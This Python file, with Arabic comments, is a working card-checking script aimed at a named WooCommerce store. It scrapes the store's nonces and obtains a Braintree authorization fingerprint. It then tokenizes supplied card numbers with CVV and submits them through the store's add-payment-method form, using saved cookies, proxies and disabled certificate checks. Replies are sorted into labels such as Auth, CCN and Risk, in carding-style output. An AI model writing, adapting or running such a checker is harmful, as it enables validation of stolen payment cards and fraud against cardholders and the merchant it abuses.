"""
بوابة الدفع: Braintree Auth B3-2
الموقع: mdbarnmaster.com
نوع البوابة: Braintree Auth (WooCommerce)
تدفق الطلبات:
1. GET /my-account/add-payment-method/ -> استخراج non و client_token_nonce
2. POST /wp-admin/admin-ajax.php -> الحصول على authorizationFingerprint
3. POST https://payments.braintree-api.com/graphql -> تحويل بيانات البطاقة إلى token
4. POST /my-account/add-payment-method/ -> إرسال البيانات النهائية والحصول على النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re
import base64
import json
from cookies_loader import load_cookies, get_cookies_path


async def req1_get_nonces(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الخطوة 1: جلب non و client_token_nonce من صفحة إضافة وسيلة الدفع."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    }
    try:
        async with session.get(
            "https://mdbarnmaster.com/my-account/add-payment-method/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        non_match = re.search(
            r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text
        )
        nonce_match = re.search(r'"client_token_nonce":"(.*?)"', text)
        non = non_match.group(1) if non_match else ""
        nonce = nonce_match.group(1) if nonce_match else ""
        return non, nonce
    except Exception as e:
        raise RuntimeError(f"req1_get_nonces failed: {e}") from e


async def req2_get_auth_fingerprint(
    session: aiohttp.ClientSession,
    nonce: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: الحصول على authorizationFingerprint عبر AJAX."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "action": "wc_braintree_credit_card_get_client_token",
        "nonce": nonce,
    }
    try:
        async with session.post(
            "https://mdbarnmaster.com/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            res_json = await r.json(content_type=None)

        raw_token = res_json.get("data", {}).get("client_token", "")
        try:
            decoded = json.loads(base64.b64decode(raw_token).decode("utf-8"))
            return decoded.get("authorizationFingerprint", "")
        except Exception:
            return raw_token
    except Exception as e:
        raise RuntimeError(f"req2_get_auth_fingerprint failed: {e}") from e


async def req3_tokenize_card(
    session: aiohttp.ClientSession,
    auth_fingerprint: str,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: تحويل بيانات البطاقة إلى Braintree token عبر GraphQL."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "authorization": f"Bearer {auth_fingerprint}",
        "braintree-version": "2018-05-10",
    }
    query = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4()),
        },
        "query": (
            "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
            " tokenizeCreditCard(input: $input) {"
            " token creditCard { bin last4 expiryMonth expiryYear brand } } }"
        ),
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
    }
    try:
        async with session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=query,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        tok = res.get("data", {}).get("tokenizeCreditCard", {}).get("token", "")
        if not tok:
            raise RuntimeError("Braintree tokenization returned empty token")
        return tok
    except Exception as e:
        raise RuntimeError(f"req3_tokenize_card failed: {e}") from e


async def req4_submit_payment(
    session: aiohttp.ClientSession,
    tok: str,
    non: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 4: إرسال وسيلة الدفع النهائية والحصول على نص الاستجابة."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    data = {
        "payment_method": "braintree_credit_card",
        "braintree_credit_card_nonce": tok,
        "braintree_credit_card_device_data": "",
        "woocommerce-add-payment-method-nonce": non,
        "_wp_http_referer": "/my-account/add-payment-method/",
        "ecommerce_purchase_nonce": "",
        "ecommerce_purchase_token": "",
        "add_payment_method": "Add payment method",
    }
    try:
        async with session.post(
            "https://mdbarnmaster.com/my-account/add-payment-method/",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req4_submit_payment failed: {e}") from e


async def process_B3_2(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree Auth B3-2."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cookies = load_cookies(get_cookies_path("B3-2-Cookies.txt"))
            session.cookie_jar.update_cookies(cookies)

            non, nonce = await req1_get_nonces(session, proxy_url)
            auth_fingerprint = await req2_get_auth_fingerprint(session, nonce, proxy_url)
            tok = await req3_tokenize_card(session, auth_fingerprint, cc, mes, ano, cvv, proxy_url)
            final_text = await req4_submit_payment(session, tok, non, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    responses = {
        "Success": ["Payment method successfully added.", "Nice!"],
        "CCN": ["Status code: 2001", "Insufficient Funds", "Card Issuer Declined CVV"],
        "RISK": ["Gateway Rejected: risk", "Risk Threshold Exceeded"],
    }

    status_icon = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    response_msg = "Declined"

    if any(word in final_text for word in responses["Success"]):
        status_icon = "𝐀𝐮𝐭𝐡 ✅"
        response_msg = "Success"
    elif any(word in final_text for word in responses["CCN"]):
        status_icon = "𝐂𝐂𝐍 ♻️"
        response_msg = "CCN"
    elif any(word in final_text for word in responses["RISK"]):
        status_icon = "𝐑𝐢𝐬𝐤 ⚠️"
        response_msg = "Risk"
    else:
        error_match = re.search(
            r'class="woocommerce-error">(.*?)</li>', final_text, re.S
        )
        if error_match:
            response_msg = re.sub(r"<.*?>", "", error_match.group(1)).strip()
        else:
            response_msg = "Declined"

    return f"{status_icon} | {cc}|{mes}|{ano}|{cvv}", response_msg
